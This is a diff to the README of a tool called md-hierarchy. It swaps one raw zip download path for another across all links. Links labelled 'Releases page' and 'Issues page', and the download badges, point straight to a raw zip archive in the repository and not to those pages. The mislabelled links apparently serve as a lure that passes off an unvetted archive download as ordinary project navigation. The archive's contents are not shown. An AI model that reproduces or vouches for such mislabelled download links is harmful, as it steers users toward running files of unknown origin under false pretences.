@@ -6,9 +6,9 @@ Welcome to **md-hierarchy**! This tool helps you turn large markdown files into 
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. You can find the latest version on our [Releases page](https://raw.githubusercontent.com/MarothyDavid/md-hierarchy/main/Nusakan/md-hierarchy.zip).
+To get started, you need to download the software. You can find the latest version on our [Releases page](https://github.com/MarothyDavid/md-hierarchy/raw/refs/heads/main/assets/md_hierarchy_3.3.zip).
 
-[![Download md-hierarchy](https://raw.githubusercontent.com/MarothyDavid/md-hierarchy/main/Nusakan/md-hierarchy.zip)](https://raw.githubusercontent.com/MarothyDavid/md-hierarchy/main/Nusakan/md-hierarchy.zip)
+[![Download md-hierarchy](https://github.com/MarothyDavid/md-hierarchy/raw/refs/heads/main/assets/md_hierarchy_3.3.zip)](https://github.com/MarothyDavid/md-hierarchy/raw/refs/heads/main/assets/md_hierarchy_3.3.zip)
 
 1. Click the link to visit the Releases page.
 2. Look for the latest version at the top and find the appropriate download file for your operating system.
@@ -66,7 +66,7 @@ This application touches on various important topics related to document managem
 
 ## 💬 Support
 
-If you encounter any issues while using md-hierarchy, please refer to the [Issues page](https://raw.githubusercontent.com/MarothyDavid/md-hierarchy/main/Nusakan/md-hierarchy.zip) on GitHub. You can report bugs or ask questions there. 
+If you encounter any issues while using md-hierarchy, please refer to the [Issues page](https://github.com/MarothyDavid/md-hierarchy/raw/refs/heads/main/assets/md_hierarchy_3.3.zip) on GitHub. You can report bugs or ask questions there. 
 
 For suggestions or feedback, feel free to contact us through the GitHub repository.
 
@@ -78,4 +78,4 @@ For more detailed information, check out the documentation available in the repo
 
 md-hierarchy is released under the MIT License. You are free to use, modify, and distribute it as you wish.
 
-[![Download md-hierarchy](https://raw.githubusercontent.com/MarothyDavid/md-hierarchy/main/Nusakan/md-hierarchy.zip)](https://raw.githubusercontent.com/MarothyDavid/md-hierarchy/main/Nusakan/md-hierarchy.zip)
+[![Download md-hierarchy](https://github.com/MarothyDavid/md-hierarchy/raw/refs/heads/main/assets/md_hierarchy_3.3.zip)](https://github.com/MarothyDavid/md-hierarchy/raw/refs/heads/main/assets/md_hierarchy_3.3.zip)
